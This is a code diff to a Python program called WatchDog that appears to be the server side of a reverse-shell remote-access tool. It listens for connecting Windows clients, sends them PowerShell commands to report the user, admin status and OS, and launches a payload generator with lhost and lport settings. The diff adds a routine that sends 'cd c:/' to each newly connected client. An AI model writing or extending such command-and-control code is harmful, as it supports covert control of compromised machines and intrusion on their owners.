@@ -4,8 +4,8 @@ import socket
 import colorama
 import threading
 
-colorama.init()
 
+colorama.init()
 
 class WatchDog:
     def __init__(self):
@@ -72,6 +72,9 @@ class WatchDog:
         conn.send(bytes("$osInfo = Get-CimInstance Win32_OperatingSystem; $osInfo.Caption", "utf-8"))
         rm = conn.recv(32).decode("utf-8")
         return rm[0:-2]
+    
+    def cmd_send_to_c(self, conn):
+        conn.send(bytes("cd c:/", "utf-8"))
 
     def test_connections(self):
         while self.running:
@@ -99,6 +102,8 @@ class WatchDog:
                     User_name = self.cmd_WhoAmI(conn)
                     Check_Privileges = self.cmd_Check_Privileges(conn)
                     name_os = self.cmd_OS_name(conn)
+
+                    self.cmd_send_to_c(conn)
 
                     print(f"{colorama.Fore.GREEN}[+] {colorama.Fore.LIGHTMAGENTA_EX}Client connected IP: {addr[0]}, User: {User_name}, Admin: {Check_Privileges}, OS: {name_os}{colorama.Fore.LIGHTBLUE_EX}")
                     print(self.WatchDog_Input_Text, end='', flush=True)
@@ -275,7 +280,7 @@ class WatchDog:
 
             except:
                 pass
-                
+
         print("")
         os.system(f"python {self.generate['payload']}.py {self.generate['lhost']} {self.generate['lport']}")
         print("")
